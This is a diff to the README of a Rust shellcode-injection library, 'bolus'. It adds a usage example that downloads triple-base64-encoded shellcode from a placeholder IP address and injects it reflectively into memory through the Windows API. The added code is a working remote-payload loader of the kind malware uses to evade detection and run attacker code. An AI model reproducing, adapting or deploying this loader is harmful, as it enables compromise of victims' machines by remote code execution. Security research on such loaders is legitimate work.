@@ -7,5 +7,38 @@ Library for shellcode injection using the Windows API.
 ## Usage
 
 
+The following is an example implementation, which can be observed in [RustyNeedle](https://github.com/RustyNeedle):
 
+```rust
+use bolus::{
+    inject,
+    load,
+    injectors::{
+        InjectionType,
+        InjectorType
+    }
+};
 
+/// The URL where shellcode will be downloaded from
+const URL: &str = "http://1.2.3.4/note.txt";
+/// The # of base64 iterations to decode
+const B64_ITERATIONS: usize = 3;
+
+fn main() -> Result<(), String> {
+    let injector = load(
+        InjectorType::Base64Url((
+            URL.to_string(),
+            B64_ITERATIONS
+        ))
+    )?;
+    inject(
+        injector,
+        InjectionType::Reflect,
+        true
+    )
+}
+```
+
+## Documentation
+
+Full docs at [docs.rs](https://docs.rs/bolus/0.1.1/bolus/)]
